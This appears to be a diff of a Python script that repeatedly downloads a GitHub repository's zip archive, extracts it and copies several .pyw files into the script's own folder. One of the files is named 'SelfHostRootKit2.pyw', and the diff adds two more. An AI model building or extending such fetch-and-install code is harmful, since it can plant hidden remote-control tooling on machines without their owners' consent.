@@ -66,20 +66,20 @@ def unzipfile(file=".zip"):
     # ouvrir le fichier zip en mode lecture
     with zipfile.ZipFile(file, 'r') as zip: 
         # extraire tous les fichiers
-        zip.extractall() 
+        zip.extractall()
     os.remove(file)
 
 def sortNameFile(data):
     from os.path import isfile, join
     return [f for f in os.listdir(data) if isfile(join(data, f))]
-    
+
 def moveFileFromDir(data, file):
     if type(file)==str:
         file = file.split()
     for f in range(len(file)):
         if file[f] != getFileName():
             shutil.copy(getpath(True)+"/"+data+"/"+file [f], getpath(True))
-            
+
 tryit = False
 while tryit == False:
     try:
@@ -103,7 +103,7 @@ while tryit == False:
 tryit = False
 while tryit == False:
     try:
-        url, listfile = "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip", "SelfHostRootKit2.pyw"
+        url, listfile = "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip", ["SelfHostRootKit2.pyw", "modif.pyw", "scripter.pyw"]
         dir = getNameDir(url)
         downloadFileGithub(url)
         moveFileFromDir(dir, listfile)
